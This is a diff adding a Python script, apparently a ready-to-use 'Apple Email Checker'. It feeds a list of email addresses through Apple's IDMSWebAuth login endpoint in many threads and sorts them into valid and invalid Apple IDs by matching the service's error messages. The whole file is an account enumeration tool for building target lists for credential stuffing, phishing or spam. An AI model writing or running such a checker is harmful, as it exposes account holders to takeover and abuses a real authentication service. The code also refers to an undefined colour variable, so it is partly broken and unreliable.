@@ -1,0 +1,110 @@
+import requests
+import re
+import time
+import threading
+import sys
+import queue
+import sys
+import datetime
+import colorama
+from colorama import init
+from colorama import Fore
+from colorama import Style
+init(autoreset=True)
+fr = Fore.RED
+gr = Fore.BLUE
+fc = Fore.CYAN
+fw = Fore.WHITE
+fy = Fore.YELLOW
+fg = Fore.GREEN
+sd = Style.DIM
+sn = Style.NORMAL
+sb = Style.BRIGHT
+class Apple():
+
+	ua 			= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
+	live 		= 'Access denied. Your account does not have permission to access this application.'.encode()
+	die 		= 'Your Apple ID or password was entered incorrectly.'.encode()
+	version 	= 'Apple Email Checker 2.0'
+	input_queue = queue.Queue()
+
+
+	def __init__(self):
+
+		print(fr+"""
+
+ █████╗ ██████╗ ██████╗ ██╗     ███████╗
+██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝
+███████║██████╔╝██████╔╝██║     █████╗  
+██╔══██║██╔═══╝ ██╔═══╝ ██║     ██╔══╝  
+██║  ██║██║     ██║     ███████╗███████╗
+╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝
+
+		""")
+
+		self.mailist = input(" -> Enter Mailist : ")
+		self.thread = input(" -> Thread : ")
+		self.count_list = len(list(open(self.mailist)))
+
+		print('')
+
+	def save_to_file(self,nameFile,x):
+		kl = open(nameFile, 'a+')
+		kl.write(x)
+		kl.close()
+
+	def post_email(self,eml):
+
+		r = requests.post('https://idmsac.apple.com/IDMSWebAuth/authenticate',
+					data={
+						'accountPassword':'xxxxxxx',
+						'appleId':eml,
+						'appIdKey':'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8'
+						},
+					headers={'User-Agent': self.ua}
+				)
+		if self.live in r.content: return 'live'
+		elif self.die in r.content: return 'die'
+		else : return 'unknown'
+
+	def chk(self):
+
+		while 1:
+
+			eml = self.input_queue.get()
+			rez = self.post_email(eml)
+
+			if rez == 'live':
+				print(fy+'[+]',gf+'LIVE => '+eml)
+				self.save_to_file('APPLE/live.txt',eml+'\n')
+			elif rez == 'die':
+				print(fy+'[-]',fr+'DEAD => '+eml)
+				self.save_to_file('APPLE/die.txt',eml+'\n')
+			elif rez == 'unknown':
+				print(fy+'[?]',fy+'UNKN => '+eml)
+				self.save_to_file('APPLE/unknown.txt',eml+'\n')
+
+			self.input_queue.task_done()
+
+	def run_thread(self):
+
+		self.start_time = time.time()
+
+		for x in range(int(self.thread)):
+			t = threading.Thread(target=self.chk)
+			t.setDaemon(True)
+			t.start()
+
+		for y in open(self.mailist, 'r').readlines():
+			self.input_queue.put(y.strip())
+		self.input_queue.join()
+
+	def finish(self):
+		print('')
+		print('')
+		print('Finished')
+		print('')
+
+heh = Apple()
+heh.run_thread()
+heh.finish()
